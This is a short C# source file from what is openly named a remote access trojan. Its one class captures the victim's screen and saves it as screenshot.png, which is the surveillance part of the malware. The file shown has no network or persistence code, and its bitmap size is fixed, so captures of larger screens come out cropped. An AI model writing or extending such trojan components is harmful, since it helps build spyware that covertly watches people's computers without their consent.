using System;
using System.Collections.Generic;
using System.Text;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Linq;



namespace remote_access_trojan
{
    class Screenshot
    {
        public static void takeScreenshot()
        {
            // Create Bitmap image to store screenshot in
            Bitmap image;
            image = new Bitmap(1000, 900);
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            Size s = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            Graphics memoryGraphics = Graphics.FromImage(image);
            // Copy screen
            memoryGraphics.CopyFromScreen(0, 0, 0, 0, bounds.Size);

            // Save screenshot into file on Computer 
            string str = "";
            try
            {
                str = Path.Combine(Directory.GetCurrentDirectory(), "screenshot.png");
            }
            catch (Exception er)
            {
                Console.WriteLine("Sorry, there was an error: " + er.Message);
                Console.WriteLine();
            }

            // Save the image
            image.Save(str);

        }
    }
}
